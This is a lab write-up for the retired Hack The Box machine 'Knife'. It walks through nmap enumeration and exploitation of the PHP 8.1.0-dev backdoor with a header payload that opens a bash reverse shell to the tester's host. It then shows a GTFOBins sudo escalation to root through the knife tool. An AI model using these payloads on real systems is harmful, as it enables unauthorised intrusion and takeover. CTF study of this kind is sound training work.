# Knife

This is the write-up for the box Knife that got retired at the 28th August 2021.
My IP address was 10.10.14.14 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.242   knife.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/knife.nmap 10.10.10.242
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be549ca367c315c364717f6a534a4c21 (RSA)
|   256 bf8a3fd406e92e874ec97eab220ec0ee (ECDSA)
|_  256 1adea1cc37ce53bb1bfb2b0badb3f684 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

There is no interesting data and no links on the website, but by checking the HTTP headers, there is an atypical response header:
```
X-Powered-By: PHP/8.1.0-dev
```

This version of PHP was installed with a backdoor and there are [public exploit scripts](https://github.com/flast101/php-8.1.0-dev-backdoor-rce) to exploit it:
```
python3 revshell_php_8.1.0-dev.py http://10.10.10.242/ 10.10.14.14 9001
```

To exploit the backdoor manually, the [blog post](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/) explains to modify the _User-Agent_ accordingly and then it is possible to execute system commands:
```
GET / HTTP/1.1
Host: 10.10.10.242
User-Agentt: zerodiumsystem("bash -c 'bash -i >& /dev/tcp/10.10.14.14/9001 0>&1'");
(...)
```

After running the exploit script or doing it manually, the listener on my IP and port 9001 starts a reverse shell as the user _james_.

## Privilege Escalation

By checking the permissions with `sudo -l`, it shows that the user can run _/usr/bin/knife_ with root privileges:
```
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

This file is a symbolic link to the tool [Knife from Chef](https://docs.chef.io/workstation/knife/):
```
file /usr/bin/knife

/usr/bin/knife: symbolic link to /opt/chef-workstation/bin/knife
```

This tool has an entry in [GTFOBins](https://gtfobins.github.io/gtfobins/knife/) to elevate privileges to root when run with `sudo`:
```
sudo knife exec -E 'exec "/bin/bash"'
```

After running the command, a shell as root gets started!
